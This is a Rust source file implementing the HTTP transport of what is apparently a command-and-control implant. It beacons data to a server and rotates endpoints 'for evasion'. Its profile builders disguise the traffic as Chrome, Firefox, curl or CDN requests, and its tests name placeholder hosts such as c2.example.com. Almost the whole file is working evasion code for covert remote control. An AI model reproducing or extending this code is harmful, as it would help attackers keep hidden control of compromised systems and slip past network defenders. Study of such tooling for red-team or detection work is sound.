//! HTTP Transport for C2 communication
//!
//! Features:
//! - Endpoint rotation for evasion
//! - Custom headers for mimicking legitimate traffic
//! - TLS support with certificate pinning
//! - Retry logic with exponential backoff

use crate::agent::transport::{Transport, TransportConfig, TransportError, TransportResult};
use crate::protocols::http::{HttpClient, HttpRequest, HttpResponse};
use std::time::{Duration, Instant};

/// HTTP transport configuration
#[derive(Debug, Clone)]
pub struct HttpTransportConfig {
    /// Base configuration
    pub base: TransportConfig,
    /// List of endpoints to rotate through
    pub endpoints: Vec<String>,
    /// User-Agent header
    pub user_agent: String,
    /// Content-Type for requests
    pub content_type: String,
    /// Accept header
    pub accept: String,
    /// Rotate endpoint on each request
    pub rotate_per_request: bool,
    /// Maximum response size (bytes)
    pub max_response_size: usize,
}

impl Default for HttpTransportConfig {
    fn default() -> Self {
        Self {
            base: TransportConfig::default(),
            endpoints: vec!["/beacon".into()],
            user_agent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36".into(),
            content_type: "application/json".into(),
            accept: "application/json".into(),
            rotate_per_request: false,
            max_response_size: 10 * 1024 * 1024, // 10MB
        }
    }
}

impl HttpTransportConfig {
    /// Create config with server URL
    pub fn new(server_url: &str) -> Self {
        let mut config = Self::default();
        config.endpoints = vec![format!("{}/beacon", server_url)];
        config
    }

    /// Add endpoint to rotation list
    pub fn with_endpoint(mut self, endpoint: &str) -> Self {
        self.endpoints.push(endpoint.to_string());
        self
    }

    /// Set all endpoints
    pub fn with_endpoints(mut self, endpoints: Vec<String>) -> Self {
        self.endpoints = endpoints;
        self
    }

    /// Set User-Agent
    pub fn with_user_agent(mut self, ua: &str) -> Self {
        self.user_agent = ua.to_string();
        self
    }

    /// Enable TLS
    pub fn with_tls(mut self) -> Self {
        self.base.use_tls = true;
        self
    }

    /// Add certificate pin
    pub fn with_cert_pin(mut self, fingerprint: [u8; 32]) -> Self {
        self.base.cert_pins.push(fingerprint);
        self
    }

    /// Set timeout
    pub fn with_timeout(mut self, timeout: Duration) -> Self {
        self.base.io_timeout = timeout;
        self
    }

    /// Enable endpoint rotation per request
    pub fn with_rotation(mut self, enabled: bool) -> Self {
        self.rotate_per_request = enabled;
        self
    }
}

/// HTTP Transport implementation
pub struct HttpTransport {
    /// Configuration
    config: HttpTransportConfig,
    /// HTTP client
    client: HttpClient,
    /// Current endpoint index
    current_idx: usize,
    /// Connection status
    connected: bool,
    /// Last successful request time
    last_success: Option<Instant>,
    /// Request counter
    request_count: u64,
}

impl HttpTransport {
    /// Create new HTTP transport
    pub fn new(config: HttpTransportConfig) -> Self {
        let client = HttpClient::new().with_timeout(config.base.io_timeout);

        Self {
            config,
            client,
            current_idx: 0,
            connected: true,
            last_success: None,
            request_count: 0,
        }
    }

    /// Create with simple server URL
    pub fn with_url(server_url: &str) -> Self {
        Self::new(HttpTransportConfig::new(server_url))
    }

    /// Get current endpoint URL
    fn current_url(&self) -> &str {
        &self.config.endpoints[self.current_idx]
    }

    /// Build HTTP request with headers
    fn build_request(&self, data: &[u8]) -> HttpRequest {
        let mut request = HttpRequest::new("POST", self.current_url())
            .with_body(data.to_vec())
            .with_header("User-Agent", &self.config.user_agent)
            .with_header("Content-Type", &self.config.content_type)
            .with_header("Accept", &self.config.accept);

        // Add custom headers
        for (key, value) in &self.config.base.custom_headers {
            request = request.with_header(key, value);
        }

        request
    }

    /// Send request with retry logic
    fn send_with_retry(&mut self, data: &[u8]) -> TransportResult<HttpResponse> {
        let mut last_error = None;
        let max_retries = self.config.base.retry_count;

        for attempt in 0..=max_retries {
            if attempt > 0 {
                // Exponential backoff
                let delay = self.config.base.retry_delay * (1 << (attempt - 1));
                std::thread::sleep(delay);

                // Rotate endpoint on retry
                self.rotate_endpoint();
            }

            let request = self.build_request(data);

            match self.client.send(&request) {
                Ok(response) => {
                    if response.status_code >= 200 && response.status_code < 300 {
                        self.last_success = Some(Instant::now());
                        self.connected = true;
                        return Ok(response);
                    } else if response.status_code == 429 {
                        last_error = Some(TransportError::RateLimited);
                    } else {
                        last_error = Some(TransportError::Other(format!(
                            "HTTP {}",
                            response.status_code
                        )));
                    }
                }
                Err(e) => {
                    last_error = Some(TransportError::ConnectionFailed(e));
                }
            }
        }

        self.connected = false;
        Err(last_error.unwrap_or(TransportError::Other("Unknown error".into())))
    }
}

impl Transport for HttpTransport {
    fn send(&mut self, data: &[u8]) -> TransportResult<Vec<u8>> {
        self.request_count += 1;

        // Rotate endpoint if configured
        if self.config.rotate_per_request && self.request_count > 1 {
            self.rotate_endpoint();
        }

        let response = self.send_with_retry(data)?;

        // Validate response size
        if response.body.len() > self.config.max_response_size {
            return Err(TransportError::InvalidData(format!(
                "Response too large: {} bytes",
                response.body.len()
            )));
        }

        Ok(response.body)
    }

    fn is_connected(&self) -> bool {
        self.connected
    }

    fn reconnect(&mut self) -> TransportResult<()> {
        // HTTP is stateless, just reset state
        self.connected = true;
        self.current_idx = 0;
        Ok(())
    }

    fn name(&self) -> &str {
        "http"
    }

    fn current_endpoint(&self) -> String {
        self.current_url().to_string()
    }

    fn rotate_endpoint(&mut self) -> bool {
        if self.config.endpoints.len() > 1 {
            self.current_idx = (self.current_idx + 1) % self.config.endpoints.len();
            true
        } else {
            false
        }
    }

    fn close(&mut self) {
        self.connected = false;
    }
}

/// HTTP transport builder with common profiles
pub struct HttpProfileBuilder;

impl HttpProfileBuilder {
    /// Create transport mimicking Chrome browser
    pub fn chrome(server_url: &str) -> HttpTransport {
        let config = HttpTransportConfig::new(server_url).with_user_agent(
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 \
                (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        );
        HttpTransport::new(config)
    }

    /// Create transport mimicking Firefox browser
    pub fn firefox(server_url: &str) -> HttpTransport {
        let config = HttpTransportConfig::new(server_url).with_user_agent(
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) \
                Gecko/20100101 Firefox/120.0",
        );
        HttpTransport::new(config)
    }

    /// Create transport mimicking curl
    pub fn curl(server_url: &str) -> HttpTransport {
        let config = HttpTransportConfig::new(server_url).with_user_agent("curl/8.4.0");
        HttpTransport::new(config)
    }

    /// Create transport mimicking API client (minimal headers)
    pub fn api_client(server_url: &str) -> HttpTransport {
        let mut config = HttpTransportConfig::new(server_url);
        config.content_type = "application/octet-stream".into();
        config.accept = "*/*".into();
        config.user_agent = "".into();
        HttpTransport::new(config)
    }

    /// Create transport with multiple endpoints for CDN-style rotation
    pub fn cdn_rotation(base_url: &str, paths: &[&str]) -> HttpTransport {
        let endpoints: Vec<String> = paths.iter().map(|p| format!("{}{}", base_url, p)).collect();

        let config = HttpTransportConfig::default()
            .with_endpoints(endpoints)
            .with_rotation(true);
        HttpTransport::new(config)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_http_transport_config() {
        let config = HttpTransportConfig::new("http://localhost:8080")
            .with_endpoint("/api/sync")
            .with_endpoint("/status")
            .with_user_agent("TestAgent/1.0")
            .with_tls()
            .with_timeout(Duration::from_secs(5));

        assert_eq!(config.endpoints.len(), 3);
        assert!(config.base.use_tls);
        assert_eq!(config.base.io_timeout, Duration::from_secs(5));
    }

    #[test]
    fn test_endpoint_rotation() {
        let config = HttpTransportConfig::default().with_endpoints(vec![
            "http://c2.example.com/a".into(),
            "http://c2.example.com/b".into(),
            "http://c2.example.com/c".into(),
        ]);

        let mut transport = HttpTransport::new(config);

        assert_eq!(transport.current_endpoint(), "http://c2.example.com/a");

        transport.rotate_endpoint();
        assert_eq!(transport.current_endpoint(), "http://c2.example.com/b");

        transport.rotate_endpoint();
        assert_eq!(transport.current_endpoint(), "http://c2.example.com/c");

        transport.rotate_endpoint();
        assert_eq!(transport.current_endpoint(), "http://c2.example.com/a");
    }

    #[test]
    fn test_http_profiles() {
        let chrome = HttpProfileBuilder::chrome("http://localhost");
        assert!(chrome.config.user_agent.contains("Chrome"));

        let firefox = HttpProfileBuilder::firefox("http://localhost");
        assert!(firefox.config.user_agent.contains("Firefox"));

        let curl_t = HttpProfileBuilder::curl("http://localhost");
        assert!(curl_t.config.user_agent.contains("curl"));
    }

    #[test]
    fn test_cdn_rotation_builder() {
        let transport = HttpProfileBuilder::cdn_rotation(
            "https://cdn.example.com",
            &["/static/img", "/api/v1", "/health"],
        );

        assert_eq!(transport.config.endpoints.len(), 3);
        assert!(transport.config.rotate_per_request);
    }

    #[test]
    fn test_transport_name() {
        let transport = HttpTransport::with_url("http://localhost");
        assert_eq!(transport.name(), "http");
    }
}
